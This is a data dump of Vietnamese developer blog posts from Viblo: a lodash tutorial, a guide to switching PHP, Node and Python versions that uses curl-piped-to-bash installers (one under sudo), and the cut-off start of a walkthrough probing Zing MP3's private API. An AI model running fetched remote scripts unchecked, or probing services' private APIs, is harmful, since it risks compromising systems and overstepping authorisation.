        "Lodash l\u00e0 g\u00ec\nA modern JavaScript utility library delivering modularity, performance & extras.\n\n   N\u1ebfu c\u00e1c b\u1ea1n \u0111\u00e3 ho\u1eb7c \u0111ang l\u00e0m vi\u1ec7c v\u1edbi javascript th\u00ec ch\u1eafc \u0111\u00e3 nghe qua lodash. M\u1ed9t th\u01b0 vi\u1ec7c r\u1ea5t m\u1ea1nh...",
      contents:
        "##  Lodash l\u00e0 g\u00ec\n> A modern JavaScript utility library delivering modularity, performance & extras.\n   \n   N\u1ebfu c\u00e1c b\u1ea1n \u0111\u00e3 ho\u1eb7c \u0111ang l\u00e0m vi\u1ec7c v\u1edbi javascript th\u00ec ch\u1eafc \u0111\u00e3 nghe qua lodash. M\u1ed9t th\u01b0 vi\u1ec7c r\u1ea5t m\u1ea1nh m\u1ebd cung c\u1ea5p r\u1ea5t nhi\u1ec1u h\u00e0m \u0111\u1ec3 x\u1eed l\u00fd data, object, strings, number hay c\u00e1c array.... Lodash cung c\u1ea5p performance r\u1ea5t cao v\u00e0 \u0111\u1ea3m b\u1ea3o an to\u00e0n trong c\u00e1c tr\u01b0\u1eddng h\u1ee3p underfine, null,.... Ngo\u00e0i ra, khi s\u1eed d\u1ee5ng h\u00e0m lodash ch\u00fang ta th\u1ea5y code \u0111\u1eb9p v\u00e0 ng\u1eafn g\u1ecdn h\u01a1n.\n   \n   N\u00f3i t\u00fam c\u00e1i v\u00e1y l\u1ea1i l\u00e0 ngo\u00e0i c\u00e1ch d\u00f9ng c\u00e1c function th\u00f4ng th\u01b0\u1eddng kh\u00e1c nh\u01b0 x\u1eed l\u00fd m\u1ea3ng, danh s\u00e1ch, string c\u00e1c ki\u1ec3u th\u00ec c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 h\u1ecdc th\u00eam m\u1ed9t th\u1eed vi\u1ec7n x\u1ecbn x\u00f2 v\u00e0 n\u00e0y n\u1ecd l\u00e0 lodash. T\u1edb ch\u1ec9 vi\u1ebft ra \u0111\u00e2y m\u1ea5y c\u00e1i hay d\u00f9ng th\u00f4i ch\u1ee9 nhi\u1ec1u th\u1ee9 c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 \u0111\u1ecdc th\u00eam t\u00e0i li\u1ec7u c\u1ee7a lodash \u1edf [\u0111\u00e2y](https://lodash.com/docs/4.17.15)\n   \n   \u0110\u1ec3 install v\u00e0 s\u1eed d\u1ee5ng lodash t\u1ea1i [npm](https://www.npmjs.com/package/lodash) ho\u1eb7c [yarn](https://yarnpkg.com/package/lodash)\n```\n// Load the full build.\nvar _ = require('lodash');\n// Load the core build.\nvar _ = require('lodash/core');\n// Load the FP build for immutable auto-curried iteratee-first data-last methods.\nvar fp = require('lodash/fp');\n```\n## M\u1ed9t s\u1ed1 h\u00e0m th\u00f4ng d\u1ee5ng m\u00e0 t\u1edb hay d\u00f9ng\n### X\u1eed l\u00fd danh s\u00e1ch\n> _.forEach(collection, [iteratee=_.identity])\n\nGi\u1ed1ng v\u1edbi h\u00e0m foreach(), d\u00f9ng \u0111\u1ec3 l\u1eb7p qua m\u1ed7i ph\u1ea7n t\u1eed c\u1ee7a danh s\u00e1ch v\u00e0 x\u1eed l\u00fd v\u1edbi h\u00e0m.\n\n```\n_.forEach([1, 2], function(value) {\n  console.log(value);\n});\n// => Logs `1` then `2`.\n \n_.forEach({ 'a': 1, 'b': 2 }, function(value, key) {\n  console.log(key);\n});\n// => Logs 'a' then 'b' (iteration order is not guaranteed).\n```\n\n> _.filter(collection, [predicate=_.identity])\n\nL\u1eb7p l\u1ea1i c\u00e1c ph\u1ea7n t\u1eed c\u1ee7a b\u1ed9 s\u01b0u t\u1eadp, tr\u1ea3 v\u1ec1 m\u1ed9t m\u1ea3ng g\u1ed3m t\u1ea5t c\u1ea3 c\u00e1c v\u1ecb t\u1eeb ph\u1ea7n t\u1eed tr\u1ea3 v\u1ec1 gi\u00e1 tr\u1ecb true cho.  V\u1ecb t\u1eeb \u0111\u01b0\u1ee3c g\u1ecdi v\u1edbi ba \u0111\u1ed1i s\u1ed1: (value, index | key, collection).\n```\nvar users = [\n  { 'user': 'barney', 'age': 36, 'active': true },\n  { 'user': 'fred',   'age': 40, 'active': false }\n];\n \n_.filter(users, function(o) { return !o.active; });\n// => objects for ['fred']\n \n// The `_.matches` iteratee shorthand.\n_.filter(users, { 'age': 36, 'active': true });\n// => objects for ['barney']\n \n// The `_.matchesProperty` iteratee shorthand.\n_.filter(users, ['active', false]);\n// => objects for ['fred']\n \n// The `_.property` iteratee shorthand.\n_.filter(users, 'active');\n// => objects for ['barney']\n```\n\n> _.find(collection, [predicate=_.identity], [fromIndex=0])\n\nL\u1eb7p l\u1ea1i c\u00e1c ph\u1ea7n t\u1eed c\u1ee7a b\u1ed9 s\u01b0u t\u1eadp, tr\u1ea3 v\u1ec1 v\u1ecb t\u1eeb ph\u1ea7n t\u1eed \u0111\u1ea7u ti\u00ean tr\u1ea3 v\u1ec1 gi\u00e1 tr\u1ecb true cho.  V\u1ecb t\u1eeb \u0111\u01b0\u1ee3c g\u1ecdi v\u1edbi ba \u0111\u1ed1i s\u1ed1: (value, index | key, collection).\n```\nvar users = [\n  { 'user': 'barney',  'age': 36, 'active': true },\n  { 'user': 'fred',    'age': 40, 'active': false },\n  { 'user': 'pebbles', 'age': 1,  'active': true }\n];\n \n_.find(users, function(o) { return o.age < 40; });\n// => object for 'barney'\n \n// The `_.matches` iteratee shorthand.\n_.find(users, { 'age': 1, 'active': true });\n// => object for 'pebbles'\n \n// The `_.matchesProperty` iteratee shorthand.\n_.find(users, ['active', false]);\n// => object for 'fred'\n \n// The `_.property` iteratee shorthand.\n_.find(users, 'active');\n// => object for 'barney'\n```\n\n> _.findLast(collection, [predicate=_.identity], [fromIndex=collection.length-1])\n\nH\u00e0m n\u00e0y gi\u1ed1ng nh\u01b0 _.find ngo\u1ea1i tr\u1eeb vi\u1ec7c n\u00f3 l\u1eb7p l\u1ea1i c\u00e1c ph\u1ea7n t\u1eed c\u1ee7a b\u1ed9 s\u01b0u t\u1eadp t\u1eeb ph\u1ea3i sang tr\u00e1i.\n```\n_.findLast([1, 2, 3, 4], function(n) {\n  return n % 2 == 1;\n});\n// => 3\n```\n\n> _.includes(collection, value, [fromIndex=0])\n\nKi\u1ec3m tra xem gi\u00e1 tr\u1ecb c\u00f3 thu\u1ed9c danh s\u00e1ch hay kh\u00f4ng.  N\u1ebfu t\u1eadp h\u1ee3p l\u00e0 m\u1ed9t chu\u1ed7i, n\u00f3 s\u1ebd \u0111\u01b0\u1ee3c ki\u1ec3m tra \u0111\u1ec3 t\u00ecm m\u1ed9t chu\u1ed7i con c\u00f3 gi\u00e1 tr\u1ecb, n\u1ebfu kh\u00f4ng th\u00ec SameValueZero \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u0111\u1ec3 so s\u00e1nh b\u00ecnh \u0111\u1eb3ng.  N\u1ebfu fromIndex l\u00e0 s\u1ed1 \u00e2m, n\u00f3 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng l\u00e0m ph\u1ea7n b\u00f9 cho ph\u1ea7n cu\u1ed1i c\u1ee7a b\u1ed9 s\u01b0u t\u1eadp.\n```\n_.includes([1, 2, 3], 1);\n// => true\n \n_.includes([1, 2, 3], 1, 2);\n// => false\n \n_.includes({ 'a': 1, 'b': 2 }, 1);\n// => true\n \n_.includes('abcd', 'bc');\n// => true\n```\n\n> _.map(collection, [iteratee=_.identity])\n\nC\u0169ng gi\u1ed1ng v\u1edbi foreach l\u1eb7p qua c\u00e1c ph\u1ea7n t\u1eed trong danh s\u00e1ch nh\u01b0ng c\u00f3 tr\u1ea3 v\u1ec1 m\u1ed9t danh s\u00e1ch m\u1edbi.\n```\nfunction square(n) {\n  return n * n;\n}\n \n_.map([4, 8], square);\n// => [16, 64]\n \n_.map({ 'a': 4, 'b': 8 }, square);\n// => [16, 64] (iteration order is not guaranteed)\n \nvar users = [\n  { 'user': 'barney' },\n  { 'user': 'fred' }\n];\n \n// The `_.property` iteratee shorthand.\n_.map(users, 'user');\n// => ['barney', 'fred']\n```\n\nTh\u00f4i li\u1ec7t k\u00ea m\u1ec7t qu\u00e1 c\u01a1 m\u00e0 lodash support r\u1ea5t nhi\u1ec1u function cho t\u1ea5t c\u1ea3 c\u00e1c th\u1ec3 lo\u1ea1i array, collection, function, date, lang, math, number, object, seq, string, util, properties, methods.\n\nNgu\u1ed3n tham kh\u1ea3o: [https://lodash.com/docs/4.17.15](https://lodash.com/docs/4.17.15)",
      published_at: "2020-12-12 20:32:00",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 10:00:25",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 3,
      points: 5,
      views_count: 876,
      clips_count: 5,
      comments_count: 2,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 50683,
          url: "https://viblo.asia/u/khanhvuquoc.1994",
          avatar: "9a5b52db-b9dd-479f-92be-f93bb90eeb7f.gif",
          name: "KhanhVQ",
          username: "khanhvuquoc.1994",
          followers_count: 4,
          reputation: 202,
          posts_count: 8,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "lodash",
            name: "lodash",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=lodash&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "datastructures",
            name: "datastructures",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=datastructures&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascipt",
            name: "javascipt",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=javascipt&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "list",
            name: "list",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=list&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 26601,
            url: "https://viblo.asia/u/zhujinfeng",
            avatar: "76579257-2376-459c-9ebb-1b72d0b5422d.jpg",
            name: "Chu Phong",
            username: "zhujinfeng",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 50683,
            url: "https://viblo.asia/u/khanhvuquoc.1994",
            avatar: "9a5b52db-b9dd-479f-92be-f93bb90eeb7f.gif",
            name: "KhanhVQ",
            username: "khanhvuquoc.1994",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 49014,
      title:
        "B\u1ea1n c\u00f3 bi\u1ebft - B\u00ed quy\u1ebft thay version nh\u01b0 thay \u00e1o",
      slug: "m68Z0PRXZkG",
      url:
        "https://viblo.asia/p/ban-co-biet-bi-quyet-thay-version-nhu-thay-ao-m68Z0PRXZkG",
      user_id: 20215,
      moderation: null,
      transliterated: "ban-co-biet-bi-quyet-thay-version-nhu-thay-ao",
      contents_short:
        "H\u00f4m qua m\u00ecnh \u0111ang c\u00e0i th\u00eam th\u01b0 vi\u1ec7n th\u00ec g\u1eb7p l\u1ed7i nh\u01b0 v\u1eady\n\nN\u1ebfu l\u00e0m vi\u1ec7c v\u1edbi docker th\u00ec d\u1ec5 r\u1ed3i, ch\u1ec9 vi\u1ec7c \u0111\u1ed5i images, so easy. Nh\u01b0ng n\u1ebfu b\u1ea1n kh\u00f4ng d\u00f9ng docker th\u00ec sao? G\u1ee1 version c\u0169 \u0111\u1ec3 c\u00e0i version m\u1edbi ...",
      contents:
        'H\u00f4m qua m\u00ecnh \u0111ang c\u00e0i th\u00eam th\u01b0 vi\u1ec7n th\u00ec g\u1eb7p l\u1ed7i nh\u01b0 v\u1eady\n\n```js\nnpm WARN notsup Unsupported engine for @ckeditor/ckeditor5-build-inline@23.1.0:\nwanted: {"node":">=12.0.0","npm":">=5.7.1"} (current: {"node":"10.15.2","npm":"6.14.1"})\nnpm WARN notsup Not compatible with your version of node/npm: @ckeditor/ckeditor5-build-inline@23.1.0\n```\n\nN\u1ebfu l\u00e0m vi\u1ec7c v\u1edbi docker th\u00ec d\u1ec5 r\u1ed3i, ch\u1ec9 vi\u1ec7c \u0111\u1ed5i images, so easy. Nh\u01b0ng n\u1ebfu b\u1ea1n kh\u00f4ng d\u00f9ng docker th\u00ec sao? G\u1ee1 version c\u0169 \u0111\u1ec3 c\u00e0i version m\u1edbi hay l\u00e0m th\u1ebf n\u00e0o?\n\nN\u1ebfu b\u1ea1n g\u1ee1 version c\u0169 m\u00e0 kh\u00f4ng bi\u1ebft c\u00e1ch x\u00f3a h\u1ebft folder c\u1ee7a n\u00f3 th\u00ec c\u00f3 th\u1ec3 d\u1eabn t\u1edbi vi\u1ec7c conflict, ch\u01b0a k\u1ec3, khi c\u00e0i version m\u1edbi, c\u00f3 th\u1ec3 version c\u1ee7a b\u1ea1n v\u1eabn kh\u00f4ng \u0111\u1ed5i, c\u00f2n b\u1ecb l\u1ed7i. V\u1eeba hay, m\u00ecnh \u0111\u00e3 t\u00ecm \u0111\u01b0\u1ee3c v\u00e0i th\u00f4ng tin h\u1eefu \u00edch, chia s\u1ebb m\u1ed9t ch\u00fat, hi v\u1ecdng c\u00f3 th\u1ec3 gi\u00fap \u0111\u01b0\u1ee3c m\u1ecdi ng\u01b0\u1eddi.\n\n### 1. \u0110\u1ed5i version Laravel\n\nV\u00ed d\u1ee5, php m\u00e1y m\u00ecnh ban \u0111\u1ea7u l\u00e0 version `php7.2`\n```js\n$ php -v\nPHP 7.2.33-1+ubuntu16.04.1+deb.sury.org+1 (cli) (built: Aug  7 2020 14:43:59) ( NTS )\nCopyright (c) 1997-2018 The PHP Group\nZend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies\n    with Zend OPcache v7.2.33-1+ubuntu16.04.1+deb.sury.org+1, Copyright (c) 1999-2018, by Zend Technologies\n    with Xdebug v2.9.6, Copyright (c) 2002-2020, by Derick Rethans\n```\nNh\u01b0ng gi\u1edd m\u00ecnh mu\u1ed1n s\u1eed d\u1ee5ng version `php7.4`\n\n\u0110\u1ea7u ti\u00ean, m\u00ecnh s\u1ebd ki\u1ec3m tra c\u00e1c version php m\u00e0 m\u00ecnh \u0111\u00e3 c\u00e0i tr\u00ean m\u00e1y\n```js\n$ ls /usr/bin/php*\n/usr/bin/php  /usr/bin/php7.2  /usr/bin/php7.3  /usr/bin/php7.4  /usr/bin/php-config\n/usr/bin/php-config7.3  /usr/bin/php.default  /usr/bin/phpize  /usr/bin/phpize7.3\n```\nB\u1ea1n c\u00f3 th\u1ec3 th\u1ea5y m\u00e1y m\u00ecnh \u0111\u00e3 c\u00f3 `php7.4`\n\nN\u1ebfu b\u1ea1n ch\u01b0a c\u00f3, h\u00e3y  c\u00e0i th\u00eam version `php7.4` b\u1eb1ng l\u1ec7nh\n```\n$ sudo apt install php7.4\n```\n\nB\u1ea1n c\u0169ng c\u00f3 th\u1ec3 \u0111\u1ed5i version kh\u00e1c n\u1ebfu  b\u1ea1n mu\u1ed1n c\u00e0i version kh\u00e1c v\u00e0o m\u00e1y\n\n```\n$ sudo apt install <version>\n```\n\nV\u00e0 \u0110\u1eebng qu\u00ean c\u00e0i th\u00eam c\u00e1c module c\u1ea7n thi\u1ebft nh\u01b0 mysql, xml nh\u00e9\n```\n$ sudo apt install php7.4-cli php7.4-xml php7.4-mysql \n```\n\nSau khi c\u00f3 version b\u1ea1n c\u1ea7n r\u1ed3i, b\u1ea1n h\u00e3y ch\u1ea1y l\u1ec7nh sau \u0111\u1ec3 set version php m\u00e0 b\u1ea1n mu\u1ed1n s\u1eed d\u1ee5ng nh\u00e9. \u1ede \u0111\u00e2y m\u00ecnh s\u1ebd \u0111\u1ec3 verison m\u00ecnh mu\u1ed1n l\u00e0 `php7.4`\n```\n$ sudo update-alternatives --set php /usr/bin/php7.4\n```\n\nKi\u1ec3m tra xem n\u00e0o\n```js\n$ php -v\nPHP 7.4.11 (cli) (built: Oct  6 2020 10:35:19) ( NTS )\nCopyright (c) The PHP Group\nZend Engine v3.4.0, Copyright (c) Zend Technologies\n    with Zend OPcache v7.4.11, Copyright (c), by Zend Technologies\n    with Xdebug v2.9.6, Copyright (c) 2002-2020, by Derick Rethans\n```\n\u0110\u00e3 l\u00e0 **7.4**. D\u1ec5 nh\u01b0 \u0103n ch\u00e1o ph\u1ea3i kh\u00f4ng n\u00e0o (n\u1ebfu b\u1ea1n th\u00edch ch\u00e1o =)))\n\n### 2. \u0110\u1ed5i version Node\n\nTi\u1ebfp theo l\u00e0 node nh\u00e9, ch\u00fang ta s\u1ebd d\u00f9ng NVM \u0111\u1ec3 use version ch\u00fang ta mu\u1ed1n s\u1eed d\u1ee5ng.\n\n\u0110\u1ea7u ti\u00ean b\u1ea1n h\u00e3y c\u00e0i th\u00eam pakage NVM, n\u1ebfu m\u00e1y b\u1ea1n ch\u01b0a c\u00f3 pakage n\u00e0y\n```\n$ curl https://raw.githubusercontent.com/creationix/nvm/master/install.sh | bash\n```\n\nSau \u0111\u00f3, c\u00e0i th\u00eam version node m\u00e0 b\u1ea1n c\u1ea7n.\nB\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng NVM \u0111\u1ec3 c\u00e0i\n```\n$  nvm install v12.18.2\n```\nho\u1eb7c b\u1eb1ng c\u00e1ch kh\u00e1c\n```\n$ sudo apt-get update\n$ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -\n$ sudo apt-get install nodejs\n```\n>> \u0110\u00e2y l\u00e0 v\u00ed d\u1ee5 cho tr\u01b0\u1eddng h\u1ee3p b\u1ea1n mu\u1ed1n c\u00e0i node 12. B\u1ea1n c\u00f3 th\u1ec3 tham kh\u1ea3o version kh\u00e1c t\u1ea1i [\u0111\u00e2y](https://nodejs.org/en/about/releases/)\n\n<br>\n\nCu\u1ed1i c\u00f9ng, set version m\u00e0 b\u1ea1n mu\u1ed1n s\u1eed d\u1ee5ng n\u00e0o\n```\n$ nvm use v12.18.0\n```\n\nKi\u1ec3m tra l\u1ea1i nh\u00e9\n```js\nnode -v\nv12.18.2\n```\nDone r\u1ed3i ph\u1ea3i kh\u00f4ng n\u00e0o :)\n\n### 3. \u0110\u1ed5i version Python\nT\u01b0\u01a1ng t\u1ef1 php, b\u1ea1n c\u00f3 th\u1ec3 list xem nh\u1eefng version python b\u1ea1n \u0111\u00e3 c\u00e0i trong m\u00e1y\n```js\n$ ls /usr/bin/python*\n/usr/bin/python   /usr/bin/python2.7  /usr/bin/python3.5         /usr/bin/python3.5m\n/usr/bin/python3.8       /usr/bin/python3m        /usr/bin/python2  /usr/bin/python3\n/usr/bin/python3.5-config  /usr/bin/python3.5m-config  /usr/bin/python3-config  /usr/bin/python3m-config\n```\n\nN\u1ebfu version b\u1ea1n c\u1ea7n d\u00f9ng ch\u01b0a c\u00f3, h\u00e3y c\u00e0i th\u00eam ch\u00fang\n```\n$ sudo apt-get update\n$ sudo apt install python3.8\n```\n\nCu\u1ed1i c\u00f9ng, set version b\u1ea1n mu\u1ed1n s\u1eed d\u1ee5ng l\u00e0 xong r\u1ed3i :)\n\n```\n$ alias python=\'/usr/bin/python3.8\'\n```\n\nGi\u1edd th\u00ec ki\u1ec3m tra l\u1ea1i th\u00f4i n\u00e0o\n```js\n$ python --version\nPython 3.8.5\n```\n\nOke con d\u00ea qu\u00e1 d\u1ec5 =))\n\n\nTr\u00ean \u0111\u00e2y l\u00e0 m\u1ed9t s\u1ed1 m\u1eb9o m\u00ecnh ngh\u0129 s\u1ebd c\u1ea7n cho c\u00e1c b\u1ea1n ch\u01b0a ti\u1ebfp x\u00fac nhi\u1ec1u v\u1edbi docker. Hi v\u1ecdng l\u00e0 b\u00e0i vi\u1ebft n\u00e0y s\u1ebd c\u00f3 \u00edch v\u1edbi c\u00e1c b\u1ea1n.\n\nT\u1ea1m bi\u1ec7t v\u00e0 h\u1eb9n g\u1eb7p l\u1ea1i b\u1ea1n \u1edf c\u00e1c b\u00e0i vi\u1ebft ti\u1ebfp theo.\n\nT\u00e0i li\u1ec7u tham kh\u1ea3o\n\n[PHP](https://www.tecmint.com/install-different-php-versions-in-ubuntu/amp/?fbclid=IwAR3uxg7M-wQu8r_e93ulzNGLOIUTAgnJSUWNpPfN6oerFUQc-vkE2o1nU9k)\n\n[Node](https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-18-04)\n\n[Python](https://phoenixnap.com/kb/how-to-install-python-3-ubuntu)',
      published_at: "2020-12-07 07:46:33",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-18 18:00:09",
      translation_source: null,
      trend_at: "2020-12-11 17:12:53",
      promoted_at: null,
      reading_time: 3,
      points: 8,
      views_count: 651,
      clips_count: 4,
      comments_count: 8,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 20215,
          url: "https://viblo.asia/u/HaiHaChan",
          avatar: "a65dcb27-2a50-485b-971a-23987aa88fa3.jpg",
          name: "H\u1ea3i H\u00e0",
          username: "HaiHaChan",
          followers_count: 71,
          reputation: 2366,
          posts_count: 44,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "python",
            name: "Python",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Python&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "laravel",
            name: "Laravel",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Laravel&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "nodejs",
            name: "Node.js",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=Nodejs&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 24,
            url: "https://viblo.asia/u/euclid",
            avatar: "8302cdac-9b97-4111-b654-129b2a7aec5b.png",
            name: "C\u00f9i B\u1eafp",
            username: "euclid",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 8216,
            url: "https://viblo.asia/u/slowlove",
            avatar: "cdc3792b-794c-4444-8e6e-32d51c3ac909.png",
            name: "slowlove",
            username: "slowlove",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 20215,
            url: "https://viblo.asia/u/HaiHaChan",
            avatar: "a65dcb27-2a50-485b-971a-23987aa88fa3.jpg",
            name: "H\u1ea3i H\u00e0",
            username: "HaiHaChan",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
          {
            id: 20543,
            url: "https://viblo.asia/u/minhnv",
            avatar: "3d56cd44-587e-4817-8daa-5697a154dc16.png",
            name: "Nguy\u1ec5n V\u0103n Minh",
            username: "minhnv",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 49040,
      title:
        "Zing MP3 - T\u00f4i \u0111\u00e3 khai th\u00e1c API nh\u01b0 th\u1ebf n\u00e0o ?",
      slug: "L4x5xvdaZBM",
      url:
        "https://viblo.asia/p/zing-mp3-toi-da-khai-thac-api-nhu-the-nao-L4x5xvdaZBM",
      user_id: 5509,
      moderation: null,
      transliterated: "zing-mp3-toi-da-khai-thac-api-nhu-the-nao",
      contents_short:
        'Hello xin ch\u00e0o c\u00e1c b\u1ea1n, l\u00e2u qu\u00e1 ko g\u1eb7p, t\u1ed1i nay t\u00f4i l\u1ea1i h\u1ea7u chuy\u1ec7n c\u00e1c b\u1ea1n m\u1ed9t tutorial "h\u01a1i" kh\u00f4ng ph\u1ea3i l\u1eadp tr\u00ecnh 1 x\u00edu, m\u00e0 thi\u00ean v\u1ec1 m\u1ea3ng "reverse" h\u01a1n.\nCh\u1ea3 l\u00e0 lang man x\u00edu nh\u00e9, chi\u1ec1u nay \u0111\u01b0\u1ee3c \u00f4ng...',
      contents:
        'Hello xin ch\u00e0o c\u00e1c b\u1ea1n, l\u00e2u qu\u00e1 ko g\u1eb7p, t\u1ed1i nay t\u00f4i l\u1ea1i h\u1ea7u chuy\u1ec7n c\u00e1c b\u1ea1n m\u1ed9t tutorial "h\u01a1i" kh\u00f4ng ph\u1ea3i l\u1eadp tr\u00ecnh 1 x\u00edu, m\u00e0 thi\u00ean v\u1ec1 m\u1ea3ng "reverse" h\u01a1n.\nCh\u1ea3 l\u00e0 lang man x\u00edu nh\u00e9, chi\u1ec1u nay \u0111\u01b0\u1ee3c \u00f4ng anh \u0111i\u1ec7u ra qu\u00e1n n\u01b0\u1edbc h\u01b0\u1edfng c\u00e1i l\u1ea1nh hi\u1ebfm hoi c\u1ee7a \u0110\u00e0 N\u1eb5ng, l\u1ee1 m\u1ed3m u\u1ed1ng chai sting n\u00ean t\u1ed1i v\u1ec1 ng\u1ee7 ko \u0111c, b\u00ecnh th\u01b0\u1eddng l\u00e0 t\u1edb ng\u1ee7 m\u1ea5t l\u00fac 10h r\u1ed3i, h\u00f4m nay ng\u1ed3i m\u00f2 m\u00f2 l\u01b0\u1edbt Facebook m\u00e3i\nB\u1ed7ng, \u0111\u1ecdc \u0111\u01b0\u1ee3c 1 share c\u1ee7a 1 em "sinh vi\u00ean" n\u0103m 2 v\u1ec1 ch\u1ee7 \u0111\u1ec1 em \u1ea5y th\u00e1m th\u00ednh  v\u00e0 x\u1eed l\u00fd c\u00e1i API c\u1ee7a Zing r\u1ea5t ngon ! Chi ti\u1ebft anh em \u0111\u1ecdc \u1edf \u0111\u00e2y: https://vovanhoangtuan4-2.medium.com/t%C3%B4i-%C4%91%C3%A3-l%E1%BA%A5y-api-zingmp3-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-55f5fa555eda\n\nT\u00f4i b\u1ed7ng c\u1ea3m th\u1ea5y x\u1ea5u h\u1ed5 :( Th\u1ea7m ngh\u0129 "M\u00e1, n\u0103m 2 ng\u01b0\u1eddi ta \u0111\u00e3 khai th\u00e1c \u0111\u01b0\u1ee3c API c\u1ee7a MP3 ZING, trong khi m\u00ecnh n\u0103m 2 ch\u1ec9 bi\u1ebft \u0111\u00e1nh b\u00e0i" :( Bu\u1ed3n qu\u00e1 anh em \u1ea1\nNh\u01b0ng m\u00e0 b\u1ea3n ch\u1ea5t t\u00f2 m\u00f2 c\u1ee7a m\u00ecnh c\u0169ng n\u1ed5i l\u00ean, em \u1ea5y l\u00e0m \u0111\u01b0\u1ee3c th\u00ec ch\u00fang ta c\u0169ng l\u00e0m \u0111\u01b0\u1ee3c, c\u00f3 v\u1ecb g\u00ec \u0111\u00e2u ph\u1ea3i ng\u1ea1i. Sau khi kh\u00e1m ph\u00e1 ra nh\u1eefng g\u00ec em \u1ea5y \u0111\u00e3 l\u00e0m th\u00ec m\u00ecnh xin h\u1ec7 th\u1ed1ng l\u1ea1i m\u1ed9t ch\u00fat r\u00f5 h\u01a1n v\u1ec1 k\u1ef9 thu\u1eadt khai th\u00e1c v\u00e0 debug, t\u1ea1i v\u1ed1n d\u0129 b\u00e0i medium c\u1ee7a em \u1ea5y c\u0169ng \u1ed5n r\u1ed3i, m\u00ecnh ch\u1ec9 h\u1ec7 th\u1ed1ng l\u1ea1i c\u00e1ch khai th\u00e1c sao cho c\u00e1c b\u1ea1n d\u1ec5 hi\u1ec3u v\u00e0 th\u1ef1c thi, c\u0169ng nh\u01b0 v\u1eefng tin r\u1eb1ng "Kh\u00f4ng c\u00f3 vi\u1ec7c g\u00ec kh\u00f3 - Ch\u1ec9 s\u1ee3 ko ch\u1ecbu m\u00f2" - Slogin c\u1ee7a \u0111\u1ea1i ca Cuonglee (anh em n\u00e0o c\u00e0i MU Server nh\u1eefng n\u0103m 2007 th\u00ec bi\u1ebft r\u00f5 anh n\u00e0y hehe)\n\nOkay ! D\u00e0i d\u00f2ng qu\u00e1, v\u00e0o vi\u1ec7c ch\u00ednh n\u00e0o, \u0111\u1ea7u ti\u00ean \u0111\u1ec3 explore c\u00e1i API c\u1ee7a Zing MP3 th\u00ec y\u00eau c\u1ea7u anh em d\u00f9ng Chrome, b\u1eadt DEV MODE l\u00ean v\u00e0 ch\u1ea1y v\u00e0o Web Zing n\u00e0o\n\n![](https://images.viblo.asia/542a7713-838d-45e0-b133-7a4b165f4529.PNG)\nL\u01b0u \u00fd: Ph\u1ea3i v\u00e0o ch\u1ebf \u0111\u1ed9 desktop nh\u00e9, v\u1ecb \u0111\u1ea1i ca n\u00e0o \u0111\u1ec3 ch\u1ebf \u0111\u1ed9 mobile l\u00e0 ko l\u00e0m ti\u1ebfp \u0111\u01b0\u1ee3c \u0111\u00e2u\n\nTi\u1ebfp theo, m\u1edf tab Network l\u00ean v\u00e0 b\u1eadt th\u1eed m\u1ed9t b\u00e0i nh\u1ea1c, t\u00f4i ch\u1ecdn 1 b\u00e0i c\u1ee7a Vozer \u0111\u00f3 l\u00e0 "Sao em l\u1ea1i t\u1eaft m\u00e1y"\nSau \u0111\u00f3 nh\u00ecn xem n\u00f3 fetch nh\u1eefng g\u00ec, v\u00e0 ch\u00fa \u00fd v\u00e0o nh\u1eefng c\u00e1i XHR c\u1ee7a n\u00f3, t\u00f4i \u0111\u1eb7t bi\u1ec7t th\u00edch keyword "get-streaming" hehe (nghe n\u00f3 g\u1ea7n vs m\u1ee5c 